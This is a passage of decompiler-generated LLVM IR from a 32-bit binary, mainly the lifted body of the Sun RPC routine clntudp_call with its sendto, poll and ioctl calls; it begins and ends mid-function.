  %v0_8055ab9 = phi i32 [ %v0_8055ab9.pre, %dec_label_pc_8055aaa ], [ %v0_8055aad, %dec_label_pc_8055aa0 ]
  %v1_8055aba = call i32 @free(i32 %v0_8055ab9)
  %v0_8055abf = load i32, i32* @esi, align 4
  store i32 %v0_8055a82, i32* @ebx, align 4
  store i32 %v0_8055a81, i32* @esi, align 4
  %v1_8055ac8 = call i32 @free(i32 %v0_8055abf)
  ret i32 %v1_8055ac8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055ab6, { 1, 0 }
  uselistorder label %dec_label_pc_8055aa0, { 1, 0 }
}

define i32 @clntudp_call(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp75 = call i16 @__decompiler_undefined_function_3()
  %tmp76 = call i8 @__decompiler_undefined_function_5()
  %tmp84 = call i8 @__decompiler_undefined_function_5()
  %tmp85 = call i8 @__decompiler_undefined_function_5()
  %tmp86 = call i32 @__decompiler_undefined_function_0()
  %tmp88 = call i32 @__decompiler_undefined_function_0()
  %tmp107 = ptrtoint i32* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-76 = alloca i16, align 2
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8980 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-9036 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055acd = load i32, i32* @ebp, align 4
  store i32 %v0_8055acd, i32* %stack_var_-4, align 4
  %v4_8055acd = ptrtoint i32* %stack_var_-4 to i32
  store i32 1000, i32* %edx.global-to-local, align 4
  store i32 %v4_8055acd, i32* @ebp, align 4
  %v0_8055ad5 = load i32, i32* @edi, align 4
  %v0_8055ad6 = load i32, i32* @esi, align 4
  %v0_8055ad7 = load i32, i32* @ebx, align 4
  store i32 1000, i32* @ebx, align 4
  %v15_8055ada = ptrtoint i32* %stack_var_-9036 to i32
  store i32 %tmp107, i32* %eax.global-to-local, align 4
  %v1_8055ae3 = add i32 %tmp107, 8
  %v2_8055ae3 = inttoptr i32 %v1_8055ae3 to i32*
  %v3_8055ae3 = load i32, i32* %v2_8055ae3, align 4
  store i32 %v3_8055ae3, i32* @esi, align 4
  %v1_8055ae6 = add i32 %v3_8055ae3, 32
  %v2_8055ae6 = inttoptr i32 %v1_8055ae6 to i32*
  %v3_8055ae6 = load i32, i32* %v2_8055ae6, align 4
  store i32 %v3_8055ae6, i32* %eax.global-to-local, align 4
  %v2_8055ae9 = add i32 %v3_8055ae3, 28
  %v3_8055ae9 = inttoptr i32 %v2_8055ae9 to i32*
  %v4_8055ae9 = load i32, i32* %v3_8055ae9, align 4
  %v6_8055ae9 = mul i32 %v4_8055ae9, 1000
  %v1_8055af0 = ashr i32 %v3_8055ae6, 31
  %v2_8055af1 = zext i32 %v3_8055ae6 to i64
  %v4_8055af1 = zext i32 %v1_8055af0 to i64
  %v5_8055af1 = mul nuw i64 %v4_8055af1, 4294967296
  %v6_8055af1 = or i64 %v5_8055af1, %v2_8055af1
  %v8_8055af1 = sdiv i64 %v6_8055af1, 1000
  %v9_8055af1 = trunc i64 %v8_8055af1 to i32
  store i32 %v9_8055af1, i32* %eax.global-to-local, align 4
  %v10_8055af1 = srem i64 %v6_8055af1, 1000
  %v11_8055af1 = trunc i64 %v10_8055af1 to i32
  store i32 %v11_8055af1, i32* %edx.global-to-local, align 4
  %v2_8055af3 = add i32 %v9_8055af1, %v6_8055ae9
  store i32 %v2_8055af3, i32* %ecx.global-to-local, align 4
  %v1_8055afb = add i32 %v3_8055ae3, 40
  %v2_8055afb = inttoptr i32 %v1_8055afb to i32*
  %v3_8055afb = load i32, i32* %v2_8055afb, align 4
  %v13_8055afb = icmp eq i32 %v3_8055afb, -1
  %v1_8055aff = icmp eq i1 %v13_8055afb, false
  br i1 %v1_8055aff, label %dec_label_pc_8055b38, label %dec_label_pc_8055b01

dec_label_pc_8055b01:                             ; preds = %entry
  store i32 %arg7, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8055b4a

dec_label_pc_8055b15:                             ; preds = %dec_label_pc_8055c17
  %v1_8055b15 = call i32 @__errno_location(i32 %storemerge3)
  store i32 %v1_8055b15, i32* %eax.global-to-local, align 4
  %v1_8055b1a = inttoptr i32 %v1_8055b15 to i32*
  %v2_8055b1a = load i32, i32* %v1_8055b1a, align 4
  store i32 %v2_8055b1a, i32* %eax.global-to-local, align 4
  %v0_8055b1c = load i32, i32* @esi, align 4
  %v1_8055b1c = add i32 %v0_8055b1c, 44
  %v2_8055b1c = inttoptr i32 %v1_8055b1c to i32*
  store i32 3, i32* %v2_8055b1c, align 4
  %v0_8055b23 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055b23 = load i32, i32* @esi, align 4
  %v2_8055b23 = add i32 %v1_8055b23, 48
  %v3_8055b23 = inttoptr i32 %v2_8055b23 to i32*
  store i32 %v0_8055b23, i32* %v3_8055b23, align 4
  store i32 3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056021

dec_label_pc_8055b30:                             ; preds = %dec_label_pc_8055ecf
  %v1_8055b30 = add i32 %v0_8055b30, 12
  %v2_8055b30 = inttoptr i32 %v1_8055b30 to i32*
  %v3_8055b30 = load i32, i32* %v2_8055b30, align 4
  store i32 %v3_8055b30, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055f33

dec_label_pc_8055b38:                             ; preds = %entry
  store i32 %v3_8055afb, i32* %ecx.global-to-local, align 4
  %v1_8055b41 = add i32 %v3_8055ae3, 36
  %v2_8055b41 = inttoptr i32 %v1_8055b41 to i32*
  %v3_8055b41 = load i32, i32* %v2_8055b41, align 4
  store i32 %v3_8055b41, i32* @ebx, align 4
  br label %dec_label_pc_8055b4a

dec_label_pc_8055b4a:                             ; preds = %dec_label_pc_8055b01, %dec_label_pc_8055b38
  %stack_var_-9000.0 = phi i32 [ %v3_8055afb, %dec_label_pc_8055b38 ], [ %arg7, %dec_label_pc_8055b01 ]
  %storemerge3 = phi i32 [ %v3_8055b41, %dec_label_pc_8055b38 ], [ %arg6, %dec_label_pc_8055b01 ]
  %v4_8055b72 = icmp eq i32 %arg2, 0
  %v2_8055c5f = ptrtoint i32* %stack_var_-168 to i32
  %v2_8055c92 = ptrtoint i32* %stack_var_-28 to i32
  %v4_8055dc5 = and i8 %tmp84, 8
  %v5_8055dc5 = icmp eq i8 %v4_8055dc5, 0
  %v2_8055ef1 = ptrtoint i32* %stack_var_-20 to i32
  %v2_8055ef5 = ptrtoint i32* %stack_var_-60 to i32
  %v2_8055df9 = ptrtoint i16* %stack_var_-76 to i32
  %v2_8055e06 = ptrtoint i32* %stack_var_-36 to i32
  %v2_8055e1e = ptrtoint i32* %stack_var_-8980 to i32
  %v4_8055e6f = and i8 %tmp76, 32
  %v5_8055e6f = icmp eq i8 %v4_8055e6f, 0
  %v2_8055e9c = ptrtoint i32* %stack_var_-72 to i32
  %v4_8055eac = zext i16 %tmp75 to i32
  %v2_8055f68 = ptrtoint i32* %stack_var_-100 to i32
  %v2_8055f72 = ptrtoint i32* %stack_var_-180 to i32
  %v2_8055cca = ptrtoint i32* %stack_var_-44 to i32
  %v2_8055d03 = ptrtoint i32* %stack_var_-132 to i32
  %v4_8055d2b = urem i8 %tmp85, 2
  %v5_8055d2b = icmp eq i8 %v4_8055d2b, 0
  %v4_8055c41 = icmp eq i32 %storemerge3, 0
  %v4_8055c4a = icmp eq i32 %stack_var_-9000.0, 0
  %v2_8055ba3 = ptrtoint i32* %stack_var_8 to i32
  %v1_8055c48 = icmp eq i1 %v4_8055c41, false
  br label %dec_label_pc_8055b72

dec_label_pc_8055b72:                             ; preds = %dec_label_pc_805600c, %dec_label_pc_8055b4a
  %v1_8055c5755 = phi i32 [ %v15_8055ada, %dec_label_pc_8055b4a ], [ %v1_8056005, %dec_label_pc_805600c ]
  %v0_8055b85 = phi i32 [ %v3_8055ae3, %dec_label_pc_8055b4a ], [ %v0_8055b76.pre, %dec_label_pc_805600c ]
  %stack_var_-9016.0 = phi i32 [ %tmp86, %dec_label_pc_8055b4a ], [ %stack_var_-9016.2, %dec_label_pc_805600c ]
  %stack_var_-9012.0 = phi i32 [ %tmp88, %dec_label_pc_8055b4a ], [ %stack_var_-9012.2, %dec_label_pc_805600c ]
  %stack_var_-9004.0 = phi i32 [ 0, %dec_label_pc_8055b4a ], [ %stack_var_-9004.2, %dec_label_pc_805600c ]
  %stack_var_-9008.0 = phi i32 [ 0, %dec_label_pc_8055b4a ], [ %stack_var_-9008.2, %dec_label_pc_805600c ]
  %stack_var_-9020.0 = phi i32 [ 2, %dec_label_pc_8055b4a ], [ %v4_805600c, %dec_label_pc_805600c ]
  %stack_var_-9028.0 = phi i32 [ 0, %dec_label_pc_8055b4a ], [ %stack_var_-9028.2, %dec_label_pc_805600c ]
  %v1_8055b76 = add i32 %v0_8055b85, 56
  store i32 %v1_8055b76, i32* %eax.global-to-local, align 4
  br i1 %v4_8055b72, label %dec_label_pc_8055c57, label %dec_label_pc_8055bbd

dec_label_pc_8055bbd:                             ; preds = %dec_label_pc_8055b72
  %v2_8055b85 = inttoptr i32 %v1_8055b76 to i32*
  store i32 0, i32* %v2_8055b85, align 4
  store i32 %v1_8055b76, i32* %edx.global-to-local, align 4
  %v1_8055b92 = load i32, i32* @esp, align 4
  %v2_8055b92 = add i32 %v1_8055b92, -4
  %v3_8055b92 = inttoptr i32 %v2_8055b92 to i32*
  store i32 %v2_8055f72, i32* %v3_8055b92, align 4
  %v2_8055b93 = add i32 %v1_8055b92, -8
  %v3_8055b93 = inttoptr i32 %v2_8055b93 to i32*
  store i32 %v2_8055f72, i32* %v3_8055b93, align 4
  %v0_8055b94 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055b94 = add i32 %v0_8055b94, 4
  %v2_8055b94 = inttoptr i32 %v1_8055b94 to i32*
  %v3_8055b94 = load i32, i32* %v2_8055b94, align 4
  store i32 %v3_8055b94, i32* %eax.global-to-local, align 4
  %v0_8055b97 = load i32, i32* @esi, align 4
  %v1_8055b97 = add i32 %v0_8055b97, 80
  %v2_8055b97 = inttoptr i32 %v1_8055b97 to i32*
  %v3_8055b97 = load i32, i32* %v2_8055b97, align 4
  %v5_8055b97 = add i32 %v1_8055b92, -12
  %v6_8055b97 = inttoptr i32 %v5_8055b97 to i32*
  store i32 %v3_8055b97, i32* %v6_8055b97, align 4
  %v0_8055b9a = load i32, i32* %edx.global-to-local, align 4
  %v2_8055b9a = add i32 %v1_8055b92, -16
  %v3_8055b9a = inttoptr i32 %v2_8055b9a to i32*
  store i32 %v0_8055b9a, i32* %v3_8055b9a, align 4
  %v1_8055b9b = add i32 %v1_8055b92, -20
  %v2_8055b9b = inttoptr i32 %v1_8055b9b to i32*
  store i32 134568862, i32* %v2_8055b9b, align 4
  %v3_8055b9b = load i32, i32* %eax.global-to-local, align 4
  %v4_8055b9b = add i32 %v3_8055b9b, 20
  %v5_8055b9b = inttoptr i32 %v4_8055b9b to i32*
  %v6_8055b9b = load i32, i32* %v5_8055b9b, align 4
  call void @__pseudo_call(i32 %v6_8055b9b)
  %v0_8055b9e = load i32, i32* @esi, align 4
  %v1_8055b9e = add i32 %v0_8055b9e, 88
  %v2_8055b9e = inttoptr i32 %v1_8055b9e to i32*
  %v3_8055b9e = load i32, i32* %v2_8055b9e, align 4
  store i32 %v3_8055b9e, i32* %eax.global-to-local, align 4
  %v1_8055ba1 = inttoptr i32 %v3_8055b9e to i32*
  %v2_8055ba1 = load i32, i32* %v1_8055ba1, align 4
  %v3_8055ba1 = add i32 %v2_8055ba1, 1
  store i32 %v3_8055ba1, i32* %v1_8055ba1, align 4
  store i32 %v2_8055ba3, i32* %eax.global-to-local, align 4
  %v0_8055ba6 = load i32, i32* @esp, align 4
  %v1_8055ba6 = inttoptr i32 %v0_8055ba6 to i32*
  %v3_8055ba6 = add i32 %v0_8055ba6, 4
  store i32 %v1_8055b76, i32* %ecx.global-to-local, align 4
  %v1_8055bad = inttoptr i32 %v3_8055ba6 to i32*
  %v1_8055bae = add i32 %v0_8055b85, 60
  %v2_8055bae = inttoptr i32 %v1_8055bae to i32*
  %v3_8055bae = load i32, i32* %v2_8055bae, align 4
  store i32 %v3_8055bae, i32* %edx.global-to-local, align 4
  store i32 %v2_8055ba3, i32* %v1_8055bad, align 4
  %v0_8055bb2 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8055bb2, i32* %v1_8055ba6, align 4
  %v1_8055bb3 = add i32 %v0_8055ba6, -4
  %v2_8055bb3 = inttoptr i32 %v1_8055bb3 to i32*
  store i32 134568886, i32* %v2_8055bb3, align 4
  %v3_8055bb3 = load i32, i32* %edx.global-to-local, align 4
  %v4_8055bb3 = add i32 %v3_8055bb3, 4
  %v5_8055bb3 = inttoptr i32 %v4_8055bb3 to i32*
  %v6_8055bb3 = load i32, i32* %v5_8055bb3, align 4
  call void @__pseudo_call(i32 %v6_8055bb3)
  %v0_8055bb6 = load i32, i32* @esp, align 4
  store i32 %tmp107, i32* @ebx, align 4
  %v2_8055bc0 = load i32, i32* %arg1, align 4
  store i32 %v2_8055bc0, i32* %eax.global-to-local, align 4
  %v0_8055bc2 = load i32, i32* %edx.global-to-local, align 4
  %v2_8055bc2 = add i32 %v0_8055bb6, 12
  %v3_8055bc2 = inttoptr i32 %v2_8055bc2 to i32*
  store i32 %v0_8055bc2, i32* %v3_8055bc2, align 4
  %v0_8055bc3 = load i32, i32* %edx.global-to-local, align 4
  %v2_8055bc3 = add i32 %v0_8055bb6, 8
  %v3_8055bc3 = inttoptr i32 %v2_8055bc3 to i32*
  store i32 %v0_8055bc3, i32* %v3_8055bc3, align 4
  %v1_8055bc4 = add i32 %v2_8055bc0, 32
  %v2_8055bc4 = inttoptr i32 %v1_8055bc4 to i32*
  %v3_8055bc4 = load i32, i32* %v2_8055bc4, align 4
  store i32 %v3_8055bc4, i32* %edx.global-to-local, align 4
  %v5_8055bc7 = add i32 %v0_8055bb6, 4
  %v6_8055bc7 = inttoptr i32 %v5_8055bc7 to i32*
  store i32 %v1_8055b76, i32* %v6_8055bc7, align 4
  %v3_8055bcd = inttoptr i32 %v0_8055bb6 to i32*
  store i32 %v2_8055bc0, i32* %v3_8055bcd, align 4
  %v1_8055bce = add i32 %v0_8055bb6, -4
  %v2_8055bce = inttoptr i32 %v1_8055bce to i32*
  store i32 134568913, i32* %v2_8055bce, align 4
  %v3_8055bce = load i32, i32* %edx.global-to-local, align 4
  %v4_8055bce = add i32 %v3_8055bce, 4
  %v5_8055bce = inttoptr i32 %v4_8055bce to i32*
  %v6_8055bce = load i32, i32* %v5_8055bce, align 4
  call void @__pseudo_call(i32 %v6_8055bce)
  %v0_8055bd1 = load i32, i32* @esp, align 4
  %v1_8055bd4 = icmp eq i32 %v2_8055bc0, 0
  br i1 %v1_8055bd4, label %dec_label_pc_8055bed, label %dec_label_pc_8055bfe

dec_label_pc_8055bed:                             ; preds = %dec_label_pc_8055bbd
  store i32 1, i32* %eax.global-to-local, align 4
  %v0_8055bf2 = load i32, i32* @esi, align 4
  %v1_8055bf2 = add i32 %v0_8055bf2, 44
  %v2_8055bf2 = inttoptr i32 %v1_8055bf2 to i32*
  store i32 1, i32* %v2_8055bf2, align 4
  br label %dec_label_pc_8056021

dec_label_pc_8055bfe:                             ; preds = %dec_label_pc_8055bbd
  %v2_8055bd8 = add i32 %v0_8055bd1, 12
  %v3_8055bd8 = inttoptr i32 %v2_8055bd8 to i32*
  store i32 %v2_8055bc0, i32* %v3_8055bd8, align 4
  %v2_8055bd9 = add i32 %v0_8055bd1, 8
  %v3_8055bd9 = inttoptr i32 %v2_8055bd9 to i32*
  store i32 %v2_8055bc0, i32* %v3_8055bd9, align 4
  %v5_8055bda = add i32 %v0_8055bd1, 4
  %v6_8055bda = inttoptr i32 %v5_8055bda to i32*
  store i32 %arg3, i32* %v6_8055bda, align 4
  %v6_8055bdd = inttoptr i32 %v0_8055bd1 to i32*
  store i32 %v1_8055b76, i32* %v6_8055bdd, align 4
  %v1_8055be3 = add i32 %v0_8055bd1, -4
  %v2_8055be3 = inttoptr i32 %v1_8055be3 to i32*
  store i32 134568934, i32* %v2_8055be3, align 4
  call void @__pseudo_call(i32 %arg2)
  %v0_8055be6 = load i32, i32* @esp, align 4
  store i32 %v1_8055b76, i32* %edx.global-to-local, align 4
  %v3_8055c07 = load i32, i32* %v2_8055bae, align 4
  store i32 %v3_8055c07, i32* %eax.global-to-local, align 4
  %v3_8055c0a = inttoptr i32 %v0_8055be6 to i32*
  store i32 %v1_8055b76, i32* %v3_8055c0a, align 4
  %v1_8055c0b = add i32 %v0_8055be6, -4
  %v2_8055c0b = inttoptr i32 %v1_8055c0b to i32*
  store i32 134568974, i32* %v2_8055c0b, align 4
  %v3_8055c0b = load i32, i32* %eax.global-to-local, align 4
  %v4_8055c0b = add i32 %v3_8055c0b, 16
  %v5_8055c0b = inttoptr i32 %v4_8055c0b to i32*
  %v6_8055c0b = load i32, i32* %v5_8055c0b, align 4
  call void @__pseudo_call(i32 %v6_8055c0b)
  %v0_8055c0e = load i32, i32* @esp, align 4
  %v1_8055c0e = add i32 %v0_8055c0e, 16
  %v0_8055c11 = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055c17

dec_label_pc_8055c17:                             ; preds = %dec_label_pc_8055d93, %dec_label_pc_8055d7f, %dec_label_pc_8055bfe
  %v1_8055c17 = phi i32 [ %v1_8055d20, %dec_label_pc_8055d7f ], [ %v1_8055d20, %dec_label_pc_8055d93 ], [ %v1_8055c0e, %dec_label_pc_8055bfe ]
  %stack_var_-9016.1 = phi i32 [ %stack_var_-9016.3155, %dec_label_pc_8055d7f ], [ %stack_var_-9016.3155, %dec_label_pc_8055d93 ], [ %stack_var_-9016.0, %dec_label_pc_8055bfe ]
  %stack_var_-9012.1 = phi i32 [ %v0_8055cbb, %dec_label_pc_8055d7f ], [ %v0_8055cbb, %dec_label_pc_8055d93 ], [ %stack_var_-9012.0, %dec_label_pc_8055bfe ]
  %stack_var_-9004.1 = phi i32 [ %stack_var_-9004.3.lcssa, %dec_label_pc_8055d7f ], [ %stack_var_-9004.3.lcssa, %dec_label_pc_8055d93 ], [ %stack_var_-9004.0, %dec_label_pc_8055bfe ]
  %stack_var_-9008.1 = phi i32 [ %storemerge7.in.lcssa, %dec_label_pc_8055d7f ], [ %storemerge7.in.lcssa, %dec_label_pc_8055d93 ], [ %stack_var_-9008.0, %dec_label_pc_8055bfe ]
  %stack_var_-9028.1 = phi i32 [ %stack_var_-9028.2, %dec_label_pc_8055d7f ], [ %stack_var_-9028.2, %dec_label_pc_8055d93 ], [ %v0_8055c11, %dec_label_pc_8055bfe ]
  %v0_8055c17 = load i32, i32* @edi, align 4
  %v2_8055c17 = add i32 %v1_8055c17, -4
  %v3_8055c17 = inttoptr i32 %v2_8055c17 to i32*
  store i32 %v0_8055c17, i32* %v3_8055c17, align 4
  %v0_8055c18 = load i32, i32* @edi, align 4
  %v2_8055c18 = add i32 %v1_8055c17, -8
  %v3_8055c18 = inttoptr i32 %v2_8055c18 to i32*
  store i32 %v0_8055c18, i32* %v3_8055c18, align 4
  %v0_8055c19 = load i32, i32* @esi, align 4
  %v1_8055c19 = add i32 %v0_8055c19, 24
  %v2_8055c19 = inttoptr i32 %v1_8055c19 to i32*
  %v3_8055c19 = load i32, i32* %v2_8055c19, align 4
  %v5_8055c19 = add i32 %v1_8055c17, -12
  %v6_8055c19 = inttoptr i32 %v5_8055c19 to i32*
  store i32 %v3_8055c19, i32* %v6_8055c19, align 4
  %v0_8055c1c = load i32, i32* @esi, align 4
  %v1_8055c1c = add i32 %v0_8055c1c, 8
  store i32 %v1_8055c1c, i32* %eax.global-to-local, align 4
  %v2_8055c1f = add i32 %v1_8055c17, -16
  %v3_8055c1f = inttoptr i32 %v2_8055c1f to i32*
  store i32 %v1_8055c1c, i32* %v3_8055c1f, align 4
  %v1_8055c20 = add i32 %v1_8055c17, -20
  %v2_8055c20 = inttoptr i32 %v1_8055c20 to i32*
  store i32 0, i32* %v2_8055c20, align 4
  %v5_8055c22 = add i32 %v1_8055c17, -24
  %v6_8055c22 = inttoptr i32 %v5_8055c22 to i32*
  store i32 %stack_var_-9028.1, i32* %v6_8055c22, align 4
  %v0_8055c28 = load i32, i32* @esi, align 4
  %v1_8055c28 = add i32 %v0_8055c28, 88
  %v2_8055c28 = inttoptr i32 %v1_8055c28 to i32*
  %v3_8055c28 = load i32, i32* %v2_8055c28, align 4
  %v5_8055c28 = add i32 %v1_8055c17, -28
  %v6_8055c28 = inttoptr i32 %v5_8055c28 to i32*
  store i32 %v3_8055c28, i32* %v6_8055c28, align 4
  %v0_8055c2b = load i32, i32* @esi, align 4
  %v1_8055c2b = inttoptr i32 %v0_8055c2b to i32*
  %v2_8055c2b = load i32, i32* %v1_8055c2b, align 4
  %v4_8055c2b = add i32 %v1_8055c17, -32
  %v5_8055c2b = inttoptr i32 %v4_8055c2b to i32*
  store i32 %v2_8055c2b, i32* %v5_8055c2b, align 4
  %v6_8055c2d = call i32 @__libc_sendto(i32 %stack_var_-9028.1, i32 %v2_8055af3, i32 %stack_var_-9020.0, i32 %stack_var_-9016.1, i32 %stack_var_-9012.1, i32 %stack_var_-9008.1)
  store i32 %v6_8055c2d, i32* %eax.global-to-local, align 4
  %v0_8055c32 = load i32, i32* @esp, align 4
  %v1_8055c32 = add i32 %v0_8055c32, 32
  %v15_8055c35 = icmp eq i32 %v6_8055c2d, %stack_var_-9028.1
  %v1_8055c3b = icmp eq i1 %v15_8055c35, false
  br i1 %v1_8055c3b, label %dec_label_pc_8055b15, label %dec_label_pc_8055c41

dec_label_pc_8055c41:                             ; preds = %dec_label_pc_8055c17
  br i1 %v1_8055c48, label %dec_label_pc_8055c57, label %dec_label_pc_8055c4a

dec_label_pc_8055c4a:                             ; preds = %dec_label_pc_8055c41
  br i1 %v4_8055c4a, label %dec_label_pc_8055c4a.dec_label_pc_8055da5_crit_edge, label %dec_label_pc_8055c57

dec_label_pc_8055c4a.dec_label_pc_8055da5_crit_edge: ; preds = %dec_label_pc_8055c4a
  %v0_8055daa.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8055da5

dec_label_pc_8055c57:                             ; preds = %dec_label_pc_8055c4a, %dec_label_pc_8055c41, %dec_label_pc_8055b72
  %v1_8055c57 = phi i32 [ %v1_8055c5755, %dec_label_pc_8055b72 ], [ %v1_8055c32, %dec_label_pc_8055c41 ], [ %v1_8055c32, %dec_label_pc_8055c4a ]
  %stack_var_-9016.2 = phi i32 [ %stack_var_-9016.0, %dec_label_pc_8055b72 ], [ %stack_var_-9016.1, %dec_label_pc_8055c41 ], [ %stack_var_-9016.1, %dec_label_pc_8055c4a ]
  %stack_var_-9012.2 = phi i32 [ %stack_var_-9012.0, %dec_label_pc_8055b72 ], [ %stack_var_-9012.1, %dec_label_pc_8055c41 ], [ %stack_var_-9012.1, %dec_label_pc_8055c4a ]
  %stack_var_-9004.2 = phi i32 [ %stack_var_-9004.0, %dec_label_pc_8055b72 ], [ %stack_var_-9004.1, %dec_label_pc_8055c41 ], [ %stack_var_-9004.1, %dec_label_pc_8055c4a ]
  %stack_var_-9008.2 = phi i32 [ %stack_var_-9008.0, %dec_label_pc_8055b72 ], [ %stack_var_-9008.1, %dec_label_pc_8055c41 ], [ %stack_var_-9008.1, %dec_label_pc_8055c4a ]
  %stack_var_-9028.2 = phi i32 [ %stack_var_-9028.0, %dec_label_pc_8055b72 ], [ %stack_var_-9028.1, %dec_label_pc_8055c41 ], [ %stack_var_-9028.1, %dec_label_pc_8055c4a ]
  %v0_8055c57 = load i32, i32* @ebx, align 4
  %v2_8055c57 = add i32 %v1_8055c57, -4
  %v3_8055c57 = inttoptr i32 %v2_8055c57 to i32*
  store i32 %v0_8055c57, i32* %v3_8055c57, align 4
  %v1_8055c58 = add i32 %v1_8055c57, -8
  %v2_8055c58 = inttoptr i32 %v1_8055c58 to i32*
  store i32 12, i32* %v2_8055c58, align 4
  %v1_8055c5a = add i32 %v1_8055c57, -12
  %v2_8055c5a = inttoptr i32 %v1_8055c5a to i32*
  store i32 ptrtoint (i32* @global_var_8067e20.297 to i32), i32* %v2_8055c5a, align 4
  store i32 %v2_8055c5f, i32* %eax.global-to-local, align 4
  %v2_8055c65 = add i32 %v1_8055c57, -16
  %v3_8055c65 = inttoptr i32 %v2_8055c65 to i32*
  store i32 %v2_8055c5f, i32* %v3_8055c65, align 4
  %v3_8055c66 = inttoptr i32 %stack_var_-9028.2 to i16*
  %v4_8055c66 = call i32 @memcpy(i16* %v3_8055c66, i32 %v2_8055af3, i32 %stack_var_-9020.0)
  store i32 %v4_8055c66, i32* %eax.global-to-local, align 4
  store i32 %arg5, i32* %ecx.global-to-local, align 4
  %v0_8055c6e = load i32, i32* @esp, align 4
  %v1_8055c6e = add i32 %v0_8055c6e, 16
  store i32 %arg4, i32* @ebx, align 4
  %v0_8055c80 = load i32, i32* @esi, align 4
  %v1_8055c80 = inttoptr i32 %v0_8055c80 to i32*
  %v2_8055c80 = load i32, i32* %v1_8055c80, align 4
  store i32 %v2_8055c80, i32* %eax.global-to-local, align 4
  store i32 %v2_8055c80, i32* %stack_var_-28, align 4
  %v1_8055def = add i32 %stack_var_-9028.2, 286
  %v1_8055df4 = and i32 %v1_8055def, -16
  br label %dec_label_pc_8055c8b

dec_label_pc_8055c8b:                             ; preds = %dec_label_pc_8055f47, %dec_label_pc_8055f56, %dec_label_pc_8055f2d.dec_label_pc_8055c8b.backedge_crit_edge, %dec_label_pc_8055c57
  %v1_8055c8b = phi i32 [ %v1_8055c6e, %dec_label_pc_8055c57 ], [ %v1_8055c8b.pre.pre, %dec_label_pc_8055f2d.dec_label_pc_8055c8b.backedge_crit_edge ], [ %v1_8055f10, %dec_label_pc_8055f56 ], [ %v1_8055f10, %dec_label_pc_8055f47 ]
  %v0_8055c8b = phi i32 [ %arg5, %dec_label_pc_8055c57 ], [ %v0_8055c8b.pre.pre, %dec_label_pc_8055f2d.dec_label_pc_8055c8b.backedge_crit_edge ], [ %v6_8055f0b, %dec_label_pc_8055f56 ], [ %v6_8055f0b, %dec_label_pc_8055f47 ]
  %v2_8055c8b = add i32 %v1_8055c8b, -4
  %v3_8055c8b = inttoptr i32 %v2_8055c8b to i32*
  store i32 %v0_8055c8b, i32* %v3_8055c8b, align 4
  %v5_8055c8c = add i32 %v1_8055c8b, -8
  %v6_8055c8c = inttoptr i32 %v5_8055c8c to i32*
  store i32 %v2_8055af3, i32* %v6_8055c8c, align 4
  store i32 %v2_8055c92, i32* %eax.global-to-local, align 4
  %v1_8055c95 = add i32 %v1_8055c8b, -12
  %v2_8055c95 = inttoptr i32 %v1_8055c95 to i32*
  store i32 1, i32* %v2_8055c95, align 4
  %v2_8055c97 = add i32 %v1_8055c8b, -16
  %v3_8055c97 = inttoptr i32 %v2_8055c97 to i32*
  store i32 %v2_8055c92, i32* %v3_8055c97, align 4
  %v0_8055c98 = call i32 @__libc_poll()
  store i32 %v0_8055c98, i32* %eax.global-to-local, align 4
  %v0_8055c9d = load i32, i32* @esp, align 4
  %v1_8055c9d = add i32 %v0_8055c9d, 16
  %v10_8055ca0 = icmp eq i32 %v0_8055c98, -1
  br i1 %v10_8055ca0, label %dec_label_pc_8055db6, label %dec_label_pc_8055ca9

dec_label_pc_8055ca9:                             ; preds = %dec_label_pc_8055c8b
  %v1_8055ca9 = icmp eq i32 %v0_8055c98, 0
  %v1_8055cab = icmp eq i1 %v1_8055ca9, false
  br i1 %v1_8055cab, label %dec_label_pc_8055dc5, label %dec_label_pc_8055cb1

dec_label_pc_8055cb1:                             ; preds = %dec_label_pc_8055ca9
  %v0_8055cb1 = load i32, i32* @esi, align 4
  %v1_8055cb1 = inttoptr i32 %v0_8055cb1 to i32*
  %v2_8055cb1 = load i32, i32* %v1_8055cb1, align 4
  store i32 %v2_8055cb1, i32* %eax.global-to-local, align 4
  %v0_8055cb3 = load i32, i32* @edx, align 4
  %v2_8055cb3 = add i32 %v0_8055c9d, 12
  %v3_8055cb3 = inttoptr i32 %v2_8055cb3 to i32*
  store i32 %v0_8055cb3, i32* %v3_8055cb3, align 4
  store i32 8800, i32* %stack_var_-44, align 4
  %v0_8055cbb = load i32, i32* %eax.global-to-local, align 4
  store i32 %v2_8055cca, i32* %eax.global-to-local, align 4
  %v2_8055ccd = add i32 %v0_8055c9d, 8
  %v3_8055ccd = inttoptr i32 %v2_8055ccd to i32*
  store i32 %v2_8055cca, i32* %v3_8055ccd, align 4
  %v1_8055cce = add i32 %v0_8055c9d, 4
  %v2_8055cce = inttoptr i32 %v1_8055cce to i32*
  store i32 35090, i32* %v2_8055cce, align 4
  %v6_8055cd3 = inttoptr i32 %v0_8055c9d to i32*
  store i32 %v0_8055cbb, i32* %v6_8055cd3, align 4
  %v3_8055cd9 = call i32 @ioctl(i32 %v0_8055cbb, i32 %stack_var_-9008.2, i32 %stack_var_-9004.2)
